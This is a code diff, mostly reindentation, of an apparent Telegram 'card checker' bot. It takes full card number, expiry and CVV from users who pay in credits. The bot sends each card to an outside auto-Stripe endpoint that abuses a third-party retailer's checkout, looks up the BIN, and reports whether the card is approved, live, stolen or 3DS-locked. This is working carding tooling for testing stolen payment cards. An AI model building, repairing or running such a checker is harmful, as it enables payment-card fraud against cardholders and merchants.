@@ -1359,256 +1359,256 @@ logger = logging.getLogger(__name__)
 user_cooldowns = {}
 
 async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
-    """Enforces a cooldown period for a user to prevent spamming."""
-    last_run = user_cooldowns.get(user_id, 0)
-    now = datetime.now().timestamp()
-    if now - last_run < cooldown_seconds:
-        await update.effective_message.reply_text(
-            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-        return False
-    user_cooldowns[user_id] = now
-    return True
+        """Enforces a cooldown period for a user to prevent spamming."""
+        last_run = user_cooldowns.get(user_id, 0)
+        now = datetime.now().timestamp()
+        if now - last_run < cooldown_seconds:
+                await update.effective_message.reply_text(
+                        escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
+                        parse_mode=ParseMode.MARKDOWN_V2
+                )
+                return False
+        user_cooldowns[user_id] = now
+        return True
 
 async def consume_credit(user_id: int) -> bool:
-    """Consume 1 credit from DB user if available."""
-    user_data = await get_user(user_id)
-    if user_data and user_data.get("credits", 0) > 0:
-        new_credits = user_data["credits"] - 1
-        await update_user(user_id, credits=new_credits)
-        return True
-    return False
-
+        """Consume 1 credit from DB user if available."""
+        user_data = await get_user(user_id)
+        if user_data and user_data.get("credits", 0) > 0:
+                new_credits = user_data["credits"] - 1
+                await update_user(user_id, credits=new_credits)
+                return True
+        return False
 
 # Replace with your *legit* group/channel link
 BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"
 
 def escape_markdown_v2(text: str) -> str:
-    """Escapes special characters for Telegram MarkdownV2."""
-    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
-
+        """Escapes special characters for Telegram MarkdownV2."""
+        return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
 
 # ✅ Async BIN Lookup (antipublic.cc)
 async def get_bin_details(bin_number: str) -> dict:
-    bin_data = {
-        "scheme": "N/A",
-        "type": "N/A",
-        "level": "N/A",
-        "bank": "N/A",
-        "country_name": "N/A",
-        "country_emoji": "",
-        "vbv_status": None,
-        "card_type": "N/A"
-    }
+        bin_data = {
+                "scheme": "N/A",
+                "type": "N/A",
+                "level": "N/A",
+                "bank": "N/A",
+                "country_name": "N/A",
+                "country_emoji": "",
+                "vbv_status": None,
+                "card_type": "N/A"
+        }
 
-    url = f"https://bins.antipublic.cc/bins/{bin_number}"
-    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
+        url = f"https://bins.antipublic.cc/bins/{bin_number}"
+        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
 
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers, timeout=7) as response:
-                if response.status == 200:
-                    try:
-                        data = await response.json(content_type=None)
+        try:
+                async with aiohttp.ClientSession() as session:
+                        async with session.get(url, headers=headers, timeout=7) as response:
+                                if response.status == 200:
+                                        try:
+                                                data = await response.json(content_type=None)
+                                                bin_data["scheme"] = str(data.get("brand", "N/A")).upper()
+                                                bin_data["type"] = str(data.get("type", "N/A")).title()
+                                                bin_data["card_type"] = str(data.get("type", "N/A")).title()
+                                                bin_data["level"] = str(data.get("level", "N/A")).title()
+                                                bin_data["bank"] = str(data.get("bank", "N/A")).title()
+                                                bin_data["country_name"] = data.get("country_name", "N/A")
+                                                bin_data["country_emoji"] = data.get("country_flag", "")
+                                                return bin_data
+                                        except Exception as e:
+                                                logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
+                                else:
+                                        logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
+        except Exception as e:
+                logger.warning(f"BIN API call failed for {bin_number}: {e}")
 
-                        bin_data["scheme"] = str(data.get("brand", "N/A")).upper()
-                        bin_data["type"] = str(data.get("type", "N/A")).title()
-                        bin_data["card_type"] = str(data.get("type", "N/A")).title()
-                        bin_data["level"] = str(data.get("level", "N/A")).title()
-                        bin_data["bank"] = str(data.get("bank", "N/A")).title()
-                        bin_data["country_name"] = data.get("country_name", "N/A")
-                        bin_data["country_emoji"] = data.get("country_flag", "")
-                        return bin_data
-                    except Exception as e:
-                        logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
-                else:
-                    logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
-    except Exception as e:
-        logger.warning(f"BIN API call failed for {bin_number}: {e}")
-
-    return bin_data
-
-
+        return bin_data
 
 # ✅ Background check now uses live BIN data
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
-    bullet_text = escape_all_markdown("[⌇]")
-    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
-    
-    try:
-        bin_number = parts[0][:6]
-        bin_details = await get_bin_details(bin_number)
-
-        brand = (bin_details.get("scheme") or "N/A").upper()
-        issuer = (bin_details.get("bank") or "N/A").title()
-        country_name = (bin_details.get("country_name") or "N/A")
-        country_flag = bin_details.get("country_emoji", "")
-
-        # Your main API call
-        api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+        bullet_text = escape_markdown("[⌇]")
+        bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
         
-        async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=45) as resp:
-                if resp.status != 200:
-                    raise Exception(f"HTTP {resp.status}")
-                data = await resp.json()
+        try:
+                bin_number = parts[0][:6]
+                bin_details = await get_bin_details(bin_number)
 
-        api_status = (data.get("status") or "Unknown").strip()
+                brand = (bin_details.get("scheme") or "N/A").upper()
+                issuer = (bin_details.get("bank") or "N/A").title()
+                country_name = (bin_details.get("country_name") or "N/A")
+                country_flag = bin_details.get("country_emoji", "")
 
+                # Your main API call
+                api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+                
+                async with aiohttp.ClientSession() as session:
+                        async with session.get(api_url, timeout=45) as resp:
+                                if resp.status != 200:
+                                        raise Exception(f"HTTP {resp.status}")
+                                data = await resp.json()
+                api_status = (data.get("status") or "Unknown").strip()
 
-# Status formatting with safe try/except
-try:
-  status_text = api_status.upper()
-  lower_status = api_status.lower()
+        # Status formatting with safe try/except
+                try:
+                        status_text = api_status.upper()
+                        lower_status = api_status.lower()
 
-  if "approved" in lower_status:
-    status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
-  elif "declined" in lower_status:
-    status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-  elif "ccn live" in lower_status:
-    status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
-  elif "incorrect" in lower_status or "your number" in lower_status:
-    status_text = "❌ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ❌"
-  elif "3ds" in lower_status or "auth required" in lower_status:
-    status_text = "🔒 3𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔒"
-  elif "insufficient funds" in lower_status:
-    status_text = "💸 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💸"
-  elif "expired" in lower_status:
-    status_text = "⌛ 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⌛"
-  elif "stolen" in lower_status:
-    status_text = "🚫 𝗦𝗧𝗢𝗟𝗘𝗡 𝗖𝗔𝗥𝗗 🚫"
-  elif "pickup card" in lower_status:
-    status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
-  elif "fraudulent" in lower_status:
-    status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
-  elif "generic decline" in lower_status:
-    status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-  else:
-    status_text = api_status.upper()  # fallback
-except Exception as e:
-  status_text = "❌ ERROR ❌"
-  print(f"Status formatting error: {e}")
+                        if "approved" in lower_status:
+                                status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
+                        elif "declined" in lower_status:
+                                status_text = "�𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+                        elif "ccn live" in lower_status:
+                                status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
+                        elif "incorrect" in lower_status or "your number" in lower_status:
+                                status_text = "❌ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ❌"
+                        elif "3ds" in lower_status or "auth required" in lower_status:
+                                status_text = "🔒 3𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔒"
+                        elif "insufficient funds" in lower_status:
+                                status_text = "💸 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💸"
+                        elif "expired" in lower_status:
+                                status_text = "⌛ 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⌛"
+                        elif "stolen" in lower_status:
+                                status_text = "🚫 𝗦𝗧𝗢𝗟𝗘𝗡 𝗖𝗔𝗥𝗗 🚫"
+                        elif "pickup card" in lower_status:
+                                status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
+                        elif "fraudulent" in lower_status:
+                                status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
+                        elif "generic decline" in lower_status:
+                                status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+                        else:
+                                status_text = api_status.upper()  # fallback
+                except Exception as e:
+                        status_text = "❌ ERROR ❌"
+                        print(f"Status formatting error: {e}")
 
-# Prepare header and italic API status
-header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
-formatted_response = f"_{escape_markdown_v2(api_status)}_"
+                # Prepare header and italic API status
+                header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
+                formatted_response = f"_{escape_markdown_v2(api_status)}_"
 
-# Build final message
-final_text = (
-  f"{header}\n"
-  f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ `{escape_markdown_v2(cc_normalized)}`\n"
-  f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
-  f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
-  f"――――――――――――――――\n"
-  f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown_v2(brand)}\n"
-  f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ {escape_markdown_v2(issuer)}\n"
-  f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
-  f"――――――――――――――――\n"
-  f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
-  f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
-  f"――――――――――――――――"
-)
+                # Build final message
+                final_text = (
+                        f"{header}\n"
+                        f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+                        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
+                        f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
+                        f"――――――――――――――――\n"
+                        f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown_v2(brand)}\n"
+                        f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ {escape_markdown_v2(issuer)}\n"
+                        f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
+                        f"――――――――――――――――\n"
+                        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
+                        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
+                        f"――――――――――――――――"
+                )
 
-# Send the message with MarkdownV2
-try:
-  await processing_msg.edit_text(
-    final_text,
-    parse_mode=ParseMode.MARKDOWN_V2,
-    disable_web_page_preview=True
-  )
-except Exception as e:
-  await processing_msg.edit_text(
-    f"❌ API Error: {escape_markdown_v2(str(e))}",
-    parse_mode=ParseMode.MARKDOWN_V2,
-    disable_web_page_preview=True
-  )
+                # Send the message with MarkdownV2
+                try:
+                        await processing_msg.edit_text(
+                                final_text,
+                                parse_mode=ParseMode.MARKDOWN_V2,
+                                disable_web_page_preview=True
+                        )
+                except Exception as e:
+                        await processing_msg.edit_text(
+                                f"❌ API Error: {escape_markdown_v2(str(e))}",
+                                parse_mode=ParseMode.MARKDOWN_V2,
+                                disable_web_page_preview=True
+                        )
 
-
+        except Exception as e:
+                await processing_msg.edit_text(
+                        f"❌ An error occurred during the check: {escape_markdown_v2(str(e))}",
+                        parse_mode=ParseMode.MARKDOWN_V2
+                )
+        
 # chk_command function
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-  user = update.effective_user
-  chat = update.effective_chat
-  user_id = user.id
+        user = update.effective_user
+        chat = update.effective_chat
+        user_id = user.id
 
-  # Get user data
-  user_data = await get_user(user_id)
-  if not user_data:
-    await update.effective_message.reply_text(
-      "❌ Could not fetch your user data. Try again later.",
-      parse_mode=None
-    )
-    return
+        # Get user data
+        user_data = await get_user(user_id)
+        if not user_data:
+                await update.effective_message.reply_text(
+                        "❌ Could not fetch your user data. Try again later.",
+                        parse_mode=None
+                )
+                return
 
-  # Check credits
-  if user_data.get("credits", 0) <= 0:
-    await update.effective_message.reply_text(
-      "❌ You have no credits left. Please buy a plan to get more credits.",
-      parse_mode=None
-    )
-    return
+        # Check credits
+        if user_data.get("credits", 0) <= 0:
+                await update.effective_message.reply_text(
+                        "❌ You have no credits left. Please buy a plan to get more credits.",
+                        parse_mode=None
+                )
+                return
 
-  # Cooldown check
-  if not await enforce_cooldown(user_id, update):
-    return
+        # Cooldown check
+        if not await enforce_cooldown(user_id, update):
+                return
 
-  # Get card: reply or argument
-  raw = None
-  if update.message.reply_to_message and update.message.reply_to_message.text:
-    raw = update.message.reply_to_message.text.strip()
-  elif context.args:
-    raw = ' '.join(context.args).strip()
+        # Get card: reply or argument
+        raw = None
+        if update.message.reply_to_message and update.message.reply_to_message.text:
+                raw = update.message.reply_to_message.text.strip()
+        elif context.args:
+                raw = ' '.join(context.args).strip()
 
-  if not raw or "|" not in raw:
-    await update.effective_message.reply_text(
-      "Usage: reply to a message containing number|mm|yy|cvv or use /chk number|mm|yy|cvv",
-      parse_mode=None
-    )
-    return
+        if not raw or "|" not in raw:
+                await update.effective_message.reply_text(
+                        "Usage: reply to a message containing number|mm|yy|cvv or use /chk number|mm|yy|cvv",
+                        parse_mode=None
+                )
+                return
 
-  parts = raw.split("|")
-  if len(parts) != 4:
-    await update.effective_message.reply_text(
-      "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
-      parse_mode=None
-    )
-    return
+        parts = raw.split("|")
+        if len(parts) != 4:
+                await update.effective_message.reply_text(
+                        "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
+                        parse_mode=None
+                )
+                return
 
-  # Normalize year
-  if len(parts[2]) == 4:
-    parts[2] = parts[2][-2:]
-  cc_normalized = "|".join(parts)
+        # Normalize year
+        if len(parts[2]) == 4:
+                parts[2] = parts[2][-2:]
+        cc_normalized = "|".join(parts)
 
-  # Deduct credit
-  if not await consume_credit(user_id):
-    await update.effective_message.reply_text(
-      "❌ No credits left.",
-      parse_mode=None
-    )
-    return
+        # Deduct credit
+        if not await consume_credit(user_id):
+                await update.effective_message.reply_text(
+                        "❌ No credits left.",
+                        parse_mode=None
+                )
+                return
 
-  # Define bullet link
-  bullet_text = escape_all_markdown("[⌇]")
-  bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
+        # Define bullet link
+        bullet_text = escape_markdown("[⌇]")
+        bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
 
-  # Processing message
-  processing_text = (
-    "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-    f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
-    f"{bullet_link} Gateway ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
-    f"{bullet_link} Status ➜ Checking🔎\\.\\.\\.\n"
-    "════════════════════"
-  )
+        # Processing message
+        processing_text = (
+                "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
+                f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+                f"{bullet_link} Gateway ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
+                f"{bullet_link} Status ➜ Checking🔎\\.\\.\\.\n"
+                "════════════════════"
+        )
 
-  # Send processing message
-  processing_msg = await update.effective_message.reply_text(
-    processing_text,
-    parse_mode=ParseMode.MARKDOWN_V2,
-    disable_web_page_preview=True
-  )
+        # Send processing message
+        processing_msg = await update.effective_message.reply_text(
+                processing_text,
+                parse_mode=ParseMode.MARKDOWN_V2,
+                disable_web_page_preview=True
+        )
 
-  # Start background task
-  asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))
+        # Start background task
+        asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))
+
+
 
 
 
